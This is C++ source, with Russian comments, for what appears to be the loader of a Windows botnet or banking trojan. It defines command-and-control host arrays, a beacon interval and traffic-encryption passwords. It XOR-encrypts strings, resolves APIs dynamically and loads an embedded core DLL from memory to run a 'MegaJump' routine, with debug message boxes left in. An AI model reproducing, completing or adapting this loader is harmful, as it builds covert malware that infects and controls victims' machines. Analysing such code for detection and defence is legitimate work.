#include <windows.h>

#pragma comment(linker, "/ENTRY:LoaderMain" )


#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "DllLoader.h"

#include "CoreDllDef.h"




//--------------------------------------------
//  Пароль шифрования строк
//--------------------------------------------
char SESSION_PASSWORD[MAX_SESSION_PASSW_SIZE + 1] = BOTPARAM_SESSION_PASSW;

//****************************************************************************
//  Массив хостов.
//****************************************************************************
char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;


//----------------------------------------------------------------------------
// Интервал отстука (в минутах). Строковое значение
//----------------------------------------------------------------------------
char Delay[MAX_DELAY_SIZE + 1]  = BOTPARAM_DELAY;

//----------------------------------------------------------------------------
// Префикс бота
//----------------------------------------------------------------------------
char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = BOTPARAM_PREFIX;

//----------------------------------------------------------------------------
// Основной пароль бота. Весь трафик будет шифроваться этим паролем
//----------------------------------------------------------------------------
char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;




//  Подключаем DLL ядра
namespace CoreDll
{
	#include "CoreDllData.cpp"		
}


DWORD XORCrypt::Crypt(PCHAR Password, LPBYTE Buffer, DWORD Size)
{
	DWORD a, b;
    a = 0;
	while (a < Size)
    {
		b = 0;
		while (Password[b])
		{
			Buffer[a] ^= (Password[b] + (a * b));
			b++;
		}
		a++;
    }

	return a;
}


//------------------------------------------------------------------------
// GetSessionPassword - Функция возвращает указатель на пароль для
//                      шифрования внутренних данных
//------------------------------------------------------------------------
PCHAR GetSessionPassword()
{
	return SESSION_PASSWORD;
}


//---------------------------------------------------------------------
//  Функция загрузки плагина
//---------------------------------------------------------------------
DWORD WINAPI LoaderRoutine(LPVOID)
{
	InitializeAPI();


	while (true)
	{
		pOutputDebugStringA("Loader работает");
		pSleep(1000);
	}  


	return 0;
}

//---------------------------------------------------------------------
//  Основная функция txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	InitializeAPI();

	pMessageBoxA(0, "Start", 0, 0);

	TMegaJump MegaJump = NULL;

	TMemoryDLL DLL(CoreDll::data);
	DLL.GetProcAddress(COREDLL_MEGAJUMP, (LPVOID&)MegaJump);

	if (!MegaJump)
		pMessageBoxA(0, "функция MegaJump отсутствует", 0, 0);
	else
	{
		BOOL Result = MegaJump(LoaderRoutine);
		string F;
		F.Format("Запуск функции загрузцика. Result=%d", Result);
		pMessageBoxA(0, F.t_str(), 0, 0);
	}




	pExitProcess(1);
	return 1;
}